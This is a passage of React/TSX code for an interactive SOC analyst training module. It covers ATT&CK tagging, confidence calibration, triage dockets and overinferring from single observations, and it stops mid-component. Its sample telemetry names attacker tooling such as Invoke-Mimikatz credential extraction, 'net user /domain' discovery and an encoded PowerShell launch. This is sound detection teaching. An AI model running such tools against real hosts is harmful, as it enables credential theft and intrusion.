                <div className="p-3 rounded-lg bg-black/60 border border-slate-800 space-y-1">
                  <span className="text-emerald-400 font-bold">OBSERVABLE SCRIPTBLOCK:</span>
                  <div className="text-white font-bold text-xs">Invoke-Mimikatz</div>
                  <div className="text-slate-300 text-xs">Hash: c4ca4238a0b9238...</div>
                </div>
              </div>

              <div className="mt-2 pt-2 border-t border-slate-800 text-slate-300 text-xs">
                <span className="text-cyan-400 font-bold">ANALYST JUSTIFICATION NOTE:</span> "Technique mapped based on decoded ScriptBlock log confirming invocation of credential extraction cmdlet under powershell.exe."
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">ANANYA'S ANCHOR STANDARD:</span> If a SOC auditor asks 'Why did you tag T1059.001?', your ticket must point to the exact Process GUID and CLI string within 5 seconds.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'anc-technique-tag' ? (
                          <Tag className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'anc-telemetry-anchor' ? (
                          <Hash className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'anc-observable-proof' ? (
                          <FileText className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-blue-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 14. STYLE: m13-uncertainty-confidence-levels (Uncertainty & Confidence Levels)
  // ---------------------------------------------------------------------------
  if (style === 'm13-uncertainty-confidence-levels') {
    const nodes = uncertaintyConfidenceLevelsNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <HelpCircle className="w-5 h-5 text-cyan-400" />
                <span>Expressing Uncertainty: Calibrated Confidence Ratings</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Distinguish between confirmed facts, probable hypotheses, and suspected adversary actions with professional candor.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              CONFIDENCE CALIBRATION
            </Badge>
          </div>

          {/* Confidence Meter Buttons */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">LEVEL:</span>
            {[
              { id: 'high', label: '1. High Confidence (Confirmed)', node: 'unc-confirmed-high' },
              { id: 'medium', label: '2. Medium Confidence (Probable)', node: 'unc-suspected-medium' },
              { id: 'low', label: '3. Low Confidence (Hypothesized)', node: 'unc-hypothesized-low' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setConfidenceLevel(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  confidenceLevel === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Confidence Matrix Display */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">CONFIDENCE CALIBRATION CRITERIA</span>
              <Badge className="bg-cyan-500/20 text-cyan-300 text-[11px]">STANDARDIZED QUALIFIER</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className={`p-3.5 rounded-xl border ${confidenceLevel === 'high' ? 'bg-emerald-950/50 border-emerald-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-emerald-400 font-bold">HIGH CONFIDENCE</span>
                  <Badge className="bg-emerald-950 text-emerald-300 text-[11px]">CONFIRMED</Badge>
                </div>
                <p className="text-slate-300 text-xs mt-2">
                  Corroborated across 2+ independent sources (e.g. Sysmon CLI args + EDR network connect).
                </p>
                <div className="p-2 rounded bg-black/60 border border-emerald-900/40 text-[11px] text-emerald-200 mt-2">
                  Phrase: "Telemetry definitively confirms technique T1059.001."
                </div>
              </div>

              <div className={`p-3.5 rounded-xl border ${confidenceLevel === 'medium' ? 'bg-amber-950/50 border-amber-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-amber-400 font-bold">MEDIUM CONFIDENCE</span>
                  <Badge className="bg-amber-950 text-amber-300 text-[11px]">PROBABLE</Badge>
                </div>
                <p className="text-slate-300 text-xs mt-2">
                  Strong observable present, but execution outcome or malicious intent remains ambiguous.
                </p>
                <div className="p-2 rounded bg-black/60 border border-amber-900/40 text-[11px] text-amber-200 mt-2">
                  Phrase: "Observable strongly indicates T1087, pending intent check."
                </div>
              </div>

              <div className={`p-3.5 rounded-xl border ${confidenceLevel === 'low' ? 'bg-purple-950/50 border-purple-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-purple-400 font-bold">LOW CONFIDENCE</span>
                  <Badge className="bg-purple-950 text-purple-300 text-[11px]">HYPOTHESIZED</Badge>
                </div>
                <p className="text-slate-300 text-xs mt-2">
                  Preliminary lead or working hypothesis awaiting downstream forensic acquisition.
                </p>
                <div className="p-2 rounded bg-black/60 border border-purple-900/40 text-[11px] text-purple-200 mt-2">
                  Phrase: "Hypothesized T1071 C2 beacon, awaiting proxy log dump."
                </div>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">ANANYA'S CANDOR RULE:</span> Stating 'Low Confidence / Hypothesized' is a mark of professional forensic integrity, not weakness. Overstating certainty destroys team trust.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'unc-confirmed-high' ? (
                          <CheckCircle className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'unc-suspected-medium' ? (
                          <AlertTriangle className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'unc-hypothesized-low' ? (
                          <HelpCircle className="w-6 h-6 text-purple-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-blue-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 15. STYLE: m13-audit-proof-triage-docket (Audit-Proof Triage Docket)
  // ---------------------------------------------------------------------------
  if (style === 'm13-audit-proof-triage-docket') {
    const nodes = auditProofTriageDocketNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <FileText className="w-5 h-5 text-cyan-400" />
                <span>The Audit-Proof L1 Triage Docket Format</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Standardized case ticket schema incorporating ATT&amp;CK technique tags, confidence scores, and observable evidence anchors.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              TRIAGE DOCKET
            </Badge>
          </div>

          {/* Docket View Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">FORMAT:</span>
            {[
              { id: 'rendered', label: '1. Rendered Docket Card', node: 'doc-docket-header' },
              { id: 'stix_json', label: '2. Machine-Readable STIX 2.1 / JSON', node: 'doc-technique-matrix' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setDocketView(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  docketView === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Docket Display */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">CASE #2026-ATT-912 • HOST: BLR-BR-WS-04</span>
              <Badge className="bg-emerald-500/20 text-emerald-300 text-[11px]">AUDIT-PROOF TRIAGE READY</Badge>
            </div>

            {docketView === 'rendered' ? (
              <div className="p-3.5 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-[11px]">
                  <div><span className="text-slate-400">Timestamp:</span> <span className="text-white">2026-10-15T14:02:10Z</span></div>
                  <div><span className="text-slate-400">Host:</span> <span className="text-white">BLR-BR-WS-04</span></div>
                  <div><span className="text-slate-400">User:</span> <span className="text-white">FIN-OPS-01</span></div>
                  <div><span className="text-slate-400">Triage Analyst:</span> <span className="text-emerald-400">L1 Analyst</span></div>
                </div>

                <div className="mt-2 pt-2 border-t border-slate-800 space-y-1.5">
                  <div className="text-cyan-400 font-bold">MAPPED TECHNIQUES TABLE:</div>
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                    <div className="p-2 rounded bg-black/60 border border-slate-800">
                      <span className="text-cyan-300 font-bold">T1059.001</span>
                      <p className="text-white text-xs">PowerShell Scripting</p>
                      <p className="text-emerald-400 text-[11px]">Confidence: High (EventID 4104)</p>
                    </div>
                    <div className="p-2 rounded bg-black/60 border border-slate-800">
                      <span className="text-purple-300 font-bold">T1087.002</span>
                      <p className="text-white text-xs">Domain Account Discovery</p>
                      <p className="text-emerald-400 text-[11px]">Confidence: High (net user /domain)</p>
                    </div>
                    <div className="p-2 rounded bg-black/60 border border-slate-800">
                      <span className="text-amber-300 font-bold">T1071.001</span>
                      <p className="text-white text-xs">Web Protocols (C2)</p>
                      <p className="text-amber-400 text-[11px]">Confidence: Medium (Beacons 443)</p>
                    </div>
                  </div>
                </div>
              </div>
            ) : (
              <pre className="p-3.5 rounded-xl bg-black/80 border border-slate-800 text-emerald-300 text-xs overflow-x-auto leading-relaxed">
{`{
  "ticket_id": "CDAC-SOC-2026-ATT-912",
  "disposition": "Escalated to Tier-2 IR",
  "kill_chain_phase": "Execution & Discovery",
  "mapped_techniques": [
    { "id": "T1059.001", "name": "PowerShell", "confidence": "high", "evidence_ref": "EID-4104" },
    { "id": "T1087.002", "name": "Domain Accounts", "confidence": "high", "evidence_ref": "CLI-net-user" },
    { "id": "T1071.001", "name": "Web Protocols", "confidence": "medium", "evidence_ref": "Netflow-443" }
  ],
  "lead_examiner": "Mentor Ananya (Signed)"
}`}
              </pre>
            )}

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">TIER-2 HANDOFF:</span> Complete technical docket attached. Zero ambiguity remains regarding observed commands or analyst confidence levels.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'doc-docket-header' ? (
                          <FileText className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'doc-technique-matrix' ? (
                          <Layers className="w-6 h-6 text-purple-400" />
                        ) : node.id === 'doc-confidence-qualifiers' ? (
                          <CheckCheck className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-blue-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 16. STYLE: m13-kill-chain-leap-fallacy (Kill Chain Leap Fallacy)
  // ---------------------------------------------------------------------------
  if (style === 'm13-kill-chain-leap-fallacy') {
    const nodes = killChainLeapFallacyNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <AlertTriangle className="w-5 h-5 text-rose-400" />
                <span>The "Kill Chain Leap" Fallacy: Single Observation ≠ Full APT</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Resisting cognitive bias: One discovery command does not justify hallucinating a 7-stage nation-state breach.
              </p>
            </div>
            <Badge className="bg-rose-500/20 text-rose-300 border-rose-500/30 text-xs font-mono">
              ANTI-LEAP DOCTRINE
            </Badge>
          </div>

          {/* Fallacy Mode Selector */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">MINDSET:</span>
            {[
              { id: 'calibrated', label: '1. Calibrated Reality (Empirical Boundary)', node: 'lep-empirical-boundary' },
              { id: 'hallucination', label: '2. The Hallucination Trap (Leaping 7 Stages)', node: 'lep-hallucinated-chain' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setFallacyMode(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  fallacyMode === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Leap Fallacy Visualizer */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">OBSERVABLE INGESTION: whoami.exe EXECUTED</span>
              <Badge className="bg-rose-500/20 text-rose-300 text-[11px]">COGNITIVE BIAS CHECK</Badge>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div className={`p-3.5 rounded-xl border ${fallacyMode === 'hallucination' ? 'bg-rose-950/40 border-rose-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-rose-400 font-bold text-xs">THE HALLUCINATING ANALYST</span>
                  <Badge className="bg-rose-950 text-rose-300 text-[11px]">DANGEROUS LEAP</Badge>
                </div>
                <div className="p-2.5 rounded bg-black/60 border border-rose-900/40 mt-2 text-rose-200 text-xs space-y-1">
                  <div>Observation: whoami.exe</div>
                  <div>Inferred: Full APT nation-state actor!</div>
                  <div>Inferred: DC domain credentials compromised!</div>
                  <div>Action: Company-wide network pull plug!</div>
                </div>
                <p className="text-slate-400 text-xs mt-2">
                  Result: Total business shutdown over an IT helpdesk onboarding script. Catastrophic false alarm.
                </p>
              </div>

              <div className={`p-3.5 rounded-xl border ${fallacyMode === 'calibrated' ? 'bg-emerald-950/40 border-emerald-400' : 'bg-slate-900/50 border-slate-800'}`}>
                <div className="flex items-center justify-between">
                  <span className="text-emerald-400 font-bold text-xs">THE CALIBRATED ANALYST</span>
                  <Badge className="bg-emerald-950 text-emerald-300 text-[11px]">DISCIPLINED FACT</Badge>
                </div>
                <div className="p-2.5 rounded bg-black/60 border border-emerald-900/40 mt-2 text-white text-xs space-y-1">
                  <div>Observation: whoami.exe (T1033)</div>
                  <div>Check: Parent process is explorer.exe</div>
                  <div>Check: Executed by logged-in user at 10:00 AM</div>
                  <div>Verdict: Benign local discovery. Document and close.</div>
                </div>
                <p className="text-slate-300 text-xs mt-2">
                  Result: Zero business disruption. Professional triage with complete evidentiary discipline.
                </p>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">ANANYA'S ANTI-LEAP LAW:</span> One command is one technique. Never infer an intrusion campaign unless you hold the corroborating evidence for each link in the chain.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'lep-single-observation' ? (
                          <Target className="w-6 h-6 text-cyan-400" />
                        ) : node.id === 'lep-hallucinated-chain' ? (
                          <AlertTriangle className="w-6 h-6 text-rose-400" />
                        ) : node.id === 'lep-empirical-boundary' ? (
                          <ShieldCheck className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <Scale className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 17. STYLE: m13-solid-vs-dotted-links (Solid vs Dotted Links)
  // ---------------------------------------------------------------------------
  if (style === 'm13-solid-vs-dotted-links') {
    const nodes = solidVsDottedLinksNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <GitCommit className="w-5 h-5 text-cyan-400" />
                <span>Solid vs Dotted Links: Observed Facts vs Working Hypotheses</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Visualizing attack graphs with integrity: Solid lines represent verified evidence; dotted lines represent hypotheses under investigation.
              </p>
            </div>
            <Badge className="bg-cyan-500/20 text-cyan-300 border-cyan-500/30 text-xs font-mono">
              LINKAGE DISCIPLINE
            </Badge>
          </div>

          {/* Graph View Toggle */}
          <div className="flex items-center gap-2 bg-[#040c1e] p-2 rounded-xl border border-sky-500/30 flex-wrap">
            <span className="text-xs font-mono text-slate-400 pl-1 font-semibold">VIEW:</span>
            {[
              { id: 'with_hypotheses', label: '1. Full Model (Solid Facts + Dotted Leads)', node: 'sod-dotted-working-lead' },
              { id: 'facts_only', label: '2. Confirmed Facts Only (Solid Links)', node: 'sod-solid-verified-link' },
            ].map((st) => (
              <button
                key={st.id}
                type="button"
                onClick={() => {
                  sound.playClick();
                  setGraphView(st.id as any);
                  const target = nodes.find((n) => n.id === st.node);
                  if (target) onSelectNode(target);
                }}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all ${
                  graphView === st.id
                    ? 'bg-cyan-500/25 border border-cyan-400 text-cyan-300 shadow-md shadow-cyan-500/20'
                    : 'bg-slate-900/60 border border-slate-800 text-slate-400 hover:text-slate-200'
                }`}
              >
                {st.label}
              </button>
            ))}
          </div>

          {/* Interactive Graph Canvas Display */}
          <div className="p-4 rounded-xl bg-slate-950/70 border border-slate-800/80 space-y-3 font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <span className="text-cyan-300 font-bold">ATTACK GRAPH: FORENSIC TOPOLOGY</span>
              <div className="flex items-center gap-3">
                <span className="flex items-center gap-1.5 text-emerald-400">
                  <span className="w-3 h-0.5 bg-emerald-400 inline-block"></span> SOLID = VERIFIED
                </span>
                <span className="flex items-center gap-1.5 text-amber-400">
                  <span className="w-3 h-0.5 border-t border-dashed border-amber-400 inline-block"></span> DOTTED = HYPOTHESIS
                </span>
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className="p-3 rounded-lg bg-emerald-950/40 border border-emerald-500/40 space-y-1">
                <span className="text-emerald-400 font-bold">NODE A: PHISHING ATTACHMENT</span>
                <p className="text-white text-xs">Invoice_881.xlsm</p>
                <p className="text-slate-400 text-[11px]">Sysmon Event 11: File created on disk</p>
                <div className="text-emerald-300 text-[11px] font-bold mt-1">─── SOLID LINK ───&gt;</div>
              </div>

              <div className="p-3 rounded-lg bg-emerald-950/40 border border-emerald-500/40 space-y-1">
                <span className="text-emerald-400 font-bold">NODE B: POWERSHELL SPAWN</span>
                <p className="text-white text-xs">powershell.exe -enc ...</p>
                <p className="text-slate-400 text-[11px]">Sysmon Event 1: Spawned by Excel</p>
                <div className="text-amber-400 text-[11px] font-bold mt-1">- - - DOTTED LINK - - -&gt;</div>
              </div>

              <div className={`p-3 rounded-lg border space-y-1 ${graphView === 'with_hypotheses' ? 'bg-amber-950/40 border-amber-500/40' : 'bg-slate-900/30 border-slate-800 opacity-40'}`}>
                <span className="text-amber-400 font-bold">NODE C: C2 BEACONING (?)</span>
                <p className="text-white text-xs">Outbound 198.51.100.24:443</p>
                <p className="text-slate-400 text-[11px]">Status: Hypothesis awaiting proxy corroboration</p>
                <div className="text-amber-300 text-[11px] font-bold mt-1">INQUIRY IN PROGRESS</div>
              </div>
            </div>

            <div className="p-2.5 rounded-lg bg-sky-950/40 border border-sky-500/30 text-xs text-slate-300">
              <span className="text-cyan-400 font-bold">ANANYA'S LINKAGE LAW:</span> Solid lines represent sworn court evidence. Dotted lines represent ongoing investigations. Never draw a solid line without the hash or log entry in hand.
            </div>
          </div>

          {/* 4 Node Selection Cards */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-2">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'sod-solid-verified-link' ? (
                          <Link2 className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'sod-dotted-working-lead' ? (
                          <HelpCircle className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'sod-hypothesis-testing' ? (
                          <Crosshair className="w-6 h-6 text-cyan-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 18. STYLE: m13-master-attack-signoff (Master ATT&CK Signoff)
  // ---------------------------------------------------------------------------
  if (style === 'm13-master-attack-signoff') {
    const nodes = masterAttackSignoffNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 pb-3">
            <div>
